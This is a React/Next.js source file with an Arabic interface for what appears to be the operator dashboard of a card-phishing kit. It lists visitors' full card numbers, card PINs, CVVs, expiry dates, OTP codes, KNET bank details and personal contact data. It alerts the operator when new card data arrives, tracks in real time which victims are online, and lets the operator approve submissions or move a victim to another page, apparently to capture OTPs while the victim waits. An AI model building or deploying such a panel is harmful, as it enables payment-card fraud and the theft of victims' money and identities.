"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Filter } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { auth, db, database } from "@/lib/firestore"
import { InfoIcon } from "lucide-react"
import { onValue, ref } from "firebase/database"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}
interface Notification {
  createdDate: string
  cardNumber: string
  bank?: string
  pass: string
  cardState: string
  bank_card: string[]
  prefix: string
  status: "new" | "pending" | "approved" | "rejected"
  // New fields for steps 3 and 4
  phoneNumber: string
  finalOtp: string
  id: string | "0"
  month: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  country?: string
  customer?: {
    address?: string | "0",
    city?: string | "0",
    email?: string | "0",
    fullName?: string | "0",
    phone?: string | "0",
  },
  cardData?: {
    cardNumber: string,
    cardholderName: string,
    expiryDate: string,
    cvv: string,
    cardType:string,
  }
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  year: string
  currentPage: string
  plateType: string
  allOtps?: string[]
  idNumber: string
  mobile: string
  network: string
  otp1: string
  cvv: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard" | "online">("all")
  const [onlineUserIds, setOnlineUserIds] = useState<string[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" |"ccard"| null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()
  const [onlineStatuses, setOnlineStatuses] = useState<{ [userId: string]: boolean }>({})

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    const statusRef = ref(database, "status")
    const unsubscribe = onValue(statusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineIds = Object.entries(data)
          .filter(([_, status]: [string, any]) => status.state === "online")
          .map(([userId]: [string, any]) => userId)
        setOnlineUserIds(onlineIds)
      }
    })

    return () => unsubscribe()
  }, [])

  useEffect(() => {
    // Apply filtering whenever notifications or activeFilter changes
    applyFilter(activeFilter)
  }, [notifications, activeFilter, onlineUserIds])

  const applyFilter = (filter: "all" | "withCard" | "withoutCard" | "online") => {
    switch (filter) {
      case "all":
        setFilteredNotifications(notifications)
        break
      case "withCard":
        setFilteredNotifications(notifications.filter((notification) => !!notification.cardNumber))
        break
      case "withoutCard":
        setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
        break
      case "online":
        setFilteredNotifications(notifications.filter((notification) => onlineUserIds.includes(notification.id)))
        break
      default:
        setFilteredNotifications(notifications)
    }
  }

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any

            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)

        // Fetch online statuses for all users
        const onlineStatusMap: { [userId: string]: boolean } = {}
        notificationsData.forEach((notification) => {
          const userStatusRef = ref(database, `/status/${notification.id}`)
          onValue(userStatusRef, (snapshot) => {
            const data = snapshot.val()
            onlineStatusMap[notification.id] = data && data.state === "online"
            setOnlineStatuses((prevStatuses) => ({
              ...prevStatuses,
              [notification.id]: data && data.state === "online",
            }))
          })
        })
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card"|"ccard") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }
  const getLiveStatus = (userId: string, callback: (status: string) => void) => {
    if (!userId) return

    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        callback(data.state) // "online" or "offline"
      } else {
        callback("unknown")
      }
    })
  }
  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown")

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state)
        } else {
          setStatus("unknown")
        }
      })

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe()
      }
    }, [userId])

    return (
      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
      </Badge>
    )
  }

  const handleUpdatePage = async (id: string, page: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { currentPage: page })
      setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : (notif as any))))
    } catch (error) {
      console.error("Error updating current page:", error)
    }
  }

  if (isLoading) {
    return <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">جاري التحميل...</div>
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
      <div className=" mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
              تسجيل الخروج
            </Button>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center">
            <div className="rounded-full bg-blue-100 p-3 mr-4">
              <UserCheck className="h-6 w-6 text-blue-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
              <p className="text-2xl font-bold">{onlineUsersCount}</p>
            </div>
          </div>

          {/* Total Visitors Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center">
            <div className="rounded-full bg-green-100 p-3 mr-4">
              <Users className="h-6 w-6 text-green-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">إجمالي الزوار</p>
              <p className="text-2xl font-bold">{totalVisitors}</p>
            </div>
          </div>

          {/* Card Submissions Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center sm:col-span-2 md:col-span-1">
            <div className="rounded-full bg-purple-100 p-3 mr-4">
              <CreditCard className="h-6 w-6 text-purple-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
              <p className="text-2xl font-bold">{cardSubmissions}</p>
            </div>
          </div>
        </div>

        {/* Filter Tabs */}
        <div className="bg-white rounded-lg shadow p-4 mb-6">
          <div className="flex items-center mb-2">
            <Filter className="h-5 w-5 text-gray-500 mr-2" />
            <h2 className="text-lg font-medium">تصفية الإشعارات</h2>
          </div>
          <Tabs
            defaultValue="all"
            onValueChange={(value) => setActiveFilter(value as "all" | "withCard" | "withoutCard" | "online")}
          >
            <TabsList className="grid w-full grid-cols-4">
              <TabsTrigger value="all">الكل</TabsTrigger>
              <TabsTrigger value="withCard">مع بطاقة</TabsTrigger>
              <TabsTrigger value="withoutCard">بدون بطاقة</TabsTrigger>
              <TabsTrigger value="online">متصل</TabsTrigger>
            </TabsList>
          </Tabs>
        </div>

        <div className="bg-gray-100 rounded-lg">
          {/* Desktop Table View - Hidden on Mobile */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-100">
                  <th className="px-4 py-3 text-right">الدوله</th>
                  <th className="px-4 py-3 text-right">الإسم</th>
                  <th className="px-4 py-3 text-right">المعلومات</th>
                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right">الوقت</th>
                  <th className="px-4 py-3 text-center">الاشعارات</th>
                  <th className="px-4 py-3 text-center">تحديث الصفحة</th>
                  <th className="px-4 py-3 text-center">حذف</th>
                </tr>
              </thead>
              <tbody>
                {(activeFilter === "online"
                  ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
                  : filteredNotifications
                ).map((notification) => (
                  <tr key={notification.id} className="border-b border-gray-700">
                    <td className="px-4 py-3">{notification?.country!}</td>
                    <td className="px-4 py-3">{notification.customer?.fullName!}</td>
                    <td className="px-4 py-3">
                      <div className="flex flex-col sm:flex-row gap-2">
                        <Badge
                          variant={notification.cardNumber ? "default" : "destructive"}
                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                        <Badge
                      variant={notification.cardData?.cardNumber ? "default" : "destructive"}
                      className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber? "bg-blue-500" : ""}`}
                      onClick={() => handleInfoClick(notification, "ccard")}
                    >
                      {notification.cardData?.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                    </Badge>
                        <Badge
                          variant={notification.customer?.fullName ? "default" : "secondary"}
                          className={`rounded-md cursor-pointer ${notification?.customer?.fullName ? "bg-fuchsia-500" : ""}`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          <InfoIcon className="h-4 w-4 mr-1" />
                          معلومات عامة
                        </Badge>
                      </div>
                    </td>
                    <td className="px-4 py-3"> {notification.page}</td>
                    <td className="px-4 py-3">
                      {notification.createdDate &&
                        formatDistanceToNow(new Date(notification.createdDate), {
                          addSuffix: true,
                          locale: ar,
                        })}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <UserStatusBadge userId={notification.id} />
                    </td>
                    <td className="px-4 py-3 text-center">
                      <div className="flex flex-col items-center space-y-2">{notification.status}</div>
                    </td>
                    <td className="px-4 py-3 text-center">
                      <Button
                        variant="destructive"
                        size="sm"
                        onClick={() => handleDelete(notification.id)}
                        className="bg-red-500 hover:bg-red-600"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Mobile Card View - Shown only on Mobile */}
          <div className="md:hidden space-y-4 p-2">
            {(activeFilter === "online"
              ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
              : filteredNotifications
            ).map((notification) => (
              <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
                <div className="flex justify-between items-start mb-3">
                  <div>
                    <div className="font-semibold">{notification.customer?.fullName!}</div>
                    <div className="text-sm text-gray-500">{notification?.country!}</div>
                  </div>
                  <div className="flex items-center gap-2">
                    <UserStatusBadge userId={notification.id} />
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600 h-8 w-8 p-0"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-2 mb-3">
                  <div className="flex flex-wrap gap-2">
                    <Badge
                      variant={notification.cardNumber ? "default" : "destructive"}
                      className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                      onClick={() => handleInfoClick(notification, "card")}
                    >
                      {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                    </Badge>
                    <Badge
                      variant={notification.cardData?.cardNumber ? "default" : "destructive"}
                      className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber? "bg-blue-500" : ""}`}
                      onClick={() => handleInfoClick(notification, "ccard")}
                    >
                      {notification.cardData?.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                    </Badge>
                    <Badge
                      variant={notification.customer?.fullName ? "default" : "destructive"}
                      className={`rounded-md cursor-pointer ${notification.customer?.fullName ? "bg-fuchsia-500" : ""}`}
                      onClick={() => handleInfoClick(notification, "personal")}
                    >
                      <InfoIcon className="h-4 w-4 mr-1" />
                      معلومات عامة
                    </Badge>
                  </div>

                  <div className="text-sm">
                    <span className="font-medium">الصفحة الحالية:</span> {notification.page}
                  </div>

                  <div className="text-sm">
                    <span className="font-medium">الوقت:</span>{" "}
                    {notification.createdDate &&
                      formatDistanceToNow(new Date(notification.createdDate), {
                        addSuffix: true,
                        locale: ar,
                      })}
                  </div>
                </div>

                <div className="border-t pt-3">
                  <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
                  <div className="flex flex-wrap gap-2"></div>
                  <div className="text-xs text-gray-500 mt-1"></div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-100 text-black max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="ltr">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات كي نت"
                  : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification?.customer?.fullName && (
            <div className="space-y-2">
              <p>
                <strong>الاسم:</strong> {selectedNotification?.customer?.fullName}
              </p>
              <p>
              <strong>العنوان:</strong> {selectedNotification.customer?.address}

              </p> <p>
              <strong>رقم الهاتف:</strong> {selectedNotification.customer?.phone}

              </p> <p>
              <strong>ايميل:</strong> {selectedNotification.customer?.email}

              </p>
            </div>
          )}
            {selectedInfo === "ccard" && selectedNotification?.cardData?.cardNumber && (
            <div className="space-y-2">
              <p>
                <strong>رقم البطاقة:</strong> {selectedNotification?.cardData?.cardNumber}
              </p>
              <p>
              <strong>الإسم:</strong> {selectedNotification.cardData?.cardholderName}

              </p> <p>
              <strong>تاريخ الانتهاء:</strong> {selectedNotification.cardData?.expiryDate}

              </p> <p>
              <strong>رمز امان:</strong> {selectedNotification.cardData?.cvv}

              </p> <p>
              <strong>رمز التحقق:</strong> {selectedNotification.otp1}

              </p>
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
              </p>
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                {selectedNotification.cardNumber &&
                  selectedNotification.cardNumber + " - " + selectedNotification.prefix}
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
                {selectedNotification.month}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp!}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
              </p>
            </div>
          )}
          
        </DialogContent>
      </Dialog>
    </div>
  )
}

